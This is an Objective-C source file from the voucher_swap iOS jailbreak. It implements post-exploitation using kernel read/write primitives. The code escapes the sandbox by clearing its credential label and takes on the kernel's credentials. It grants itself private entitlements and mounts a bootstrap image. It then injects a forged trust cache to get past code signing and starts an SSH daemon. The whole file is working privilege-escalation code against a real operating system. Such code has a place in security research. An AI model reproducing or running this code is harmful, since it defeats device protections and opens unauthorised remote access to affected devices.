//
//  unjail.m
//  voucher_swap
//
//  Created by xerub on 20/04/2019.
//  Copyright © 2019 xerub. All rights reserved.
//

#include <assert.h>
#include <spawn.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <mach-o/dyld.h>
#include "mach_vm.h"
#include "kernel_memory.h"
#include "kernel_slide.h"
#include "kernel_call.h"
#include "parameters.h"
#include "patchfinder64.h"
#include "libjb/libjb.h"

size_t
kread(uint64_t where, void *p, size_t size)
{
    bool ok;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        ok = kernel_read(where + offset, (char *)p + offset, chunk);
        if (!ok) {
            break;
        }
        offset += chunk;
    }
    return offset;
}

uint64_t
kread_uint64(uint64_t where)
{
    return kernel_read64(where);
}

uint32_t
kread_uint32(uint64_t where)
{
    return kernel_read32(where);
}

size_t
kwrite_uint64(uint64_t where, uint64_t value)
{
    return kernel_write64(where, value) ? sizeof(value): 0;
}

size_t
kwrite(uint64_t where, const void *p, size_t size)
{
    bool ok;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        ok = kernel_write(where + offset, (char *)p + offset, chunk);
        if (!ok) {
            break;
        }
        offset += chunk;
    }
    return offset;
}

uint64_t
kalloc(size_t size)
{
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    kern_return_t rv = mach_vm_allocate(kernel_task_port, &addr, ksize, VM_FLAGS_ANYWHERE);
    if (rv) {
        return 0;
    }
    return addr;
}

static int
execute(char *const *args)
{
    int rv;
    pid_t pid;
    int status = 0;
    rv = posix_spawn(&pid, *args, NULL, NULL, args, NULL);
    if (rv) {
        return rv;
    }
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)) {
        return WEXITSTATUS(status);
    }
    return -1;
}

int
unjail(void)
{
#if __arm64e__
    bool ok = kernel_call_init();
#else
    bool ok = kernel_slide_init();
#endif
    if (!ok) {
        printf("fail\n");
        return -1;
    }

    uint64_t our_proc = kread_uint64(current_task + OFFSET(task, bsd_info));
    uint64_t kern_proc = kread_uint64(kernel_task + OFFSET(task, bsd_info));
    uint64_t our_cred = kread_uint64(our_proc + OFFSET(proc, p_ucred));
    uint64_t kern_cred = kread_uint64(kern_proc + OFFSET(proc, p_ucred));
    // unsandbox
    kwrite_uint64(kread_uint64(our_cred + 0x78) + 0x10, 0); // cr_label

    /* start */

    int rv;
    rv = init_kernel(0, "/System/Library/Caches/com.apple.kernelcaches/kernelcache");
    assert(rv == 0);

#if __arm64e__
    uint64_t pmap_initialize_legacy_static_trust_cache_ppl = find_pmap_initialize_legacy_static_trust_cache_ppl() + kernel_slide;
    uint64_t trust_chain = find_trust_cache_ppl() + kernel_slide;
#else
    uint64_t trust_chain = find_trustcache();
    if (!trust_chain) {
        trust_chain = find_cache(1);
    }
    trust_chain += kernel_slide;
#endif

    term_kernel();

    // grant ourselves some power
    kwrite_uint64(our_proc + OFFSET(proc, p_ucred), kern_cred);

    char *p, path[4096];
    uint32_t size = sizeof(path);
    rv = _NSGetExecutablePath(path, &size);
    if (rv) {
        goto done;
    }
    p = strrchr(path, '/');
    if (!p || p + sizeof("bootstrap.dmg") >= path + sizeof(path)) {
        goto done;
    }
    memmove(++p, "bootstrap.dmg", sizeof("bootstrap.dmg"));

    /* 2. fix entitlements */
    rv = entitle(our_proc,
"	<key>com.apple.private.diskimages.kext.user-client-access</key>\n"
"	<true/>\n"
"	<key>com.apple.private.security.disk-device-access</key>\n"
"	<true/>", 1);
    printf("entitlements: %d\n", rv);
    if (rv) {
        goto done;
    }

    /* 3. attach and mount */
    char thedisk[11];
    rv = attach(path, thedisk, sizeof(thedisk));
    printf("thedisk: %d, %s\n", rv, thedisk);
    if (rv) {
        goto done;
    }

    struct hfs_mount_args args;
    memset(&args, 0, sizeof(args));
    args.fspec = thedisk;
    args.hfs_mask = 0777;
    //args.hfs_encoding = -1;
    //args.flags = HFSFSMNT_EXTENDED_ARGS;
    //struct timeval tv = { 0, 0 };
    //gettimeofday((struct timeval *)&tv, &args.hfs_timezone);
    rv = mount("hfs", "/Developer", MNT_RDONLY, &args);
    printf("mount: %d\n", rv);
    if (rv) {
        goto done;
    }

    /* 4. inject trust cache */
    printf("trust_chain = 0x%llx\n", trust_chain);

    struct trust_mem mem;
    mem.next = kread_uint64(trust_chain);
    *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
    *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;

    rv = grab_hashes("/Developer", kread, 0, mem.next);
    printf("rv = %d, numhash = %d\n", rv, numhash);

    size_t length = (sizeof(mem) + numhash * 20 + 0x3FFF) & ~0x3FFF;
    uint64_t kernel_trust = kalloc(length);
    printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);

    mem.count = numhash;
    kwrite(kernel_trust, &mem, sizeof(mem));
    kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
#if __arm64e__
    // https://gist.github.com/Proteas/22525ef733eed42313627a94af022221
    rv = kernel_call_7(pmap_initialize_legacy_static_trust_cache_ppl, 3, kernel_trust, length, 0);
    printf("trust = 0x%x\n", rv);
#else
    kwrite_uint64(trust_chain, kernel_trust);
#endif

    free(allhash);
    free(allkern);
    free(amfitab);

    /* 5. load daemons */
    rv = execute((char **)&(const char*[]){ "/Developer/bin/launchctl", "load", "/Developer/Library/LaunchDaemons/com.openssh.sshd.plist", NULL });
    printf("status = 0x%x\n", rv);

  done:
    kwrite_uint64(our_proc + OFFSET(proc, p_ucred), our_cred);
#if __arm64e__
    kernel_call_deinit();
#endif
    return 0;
}
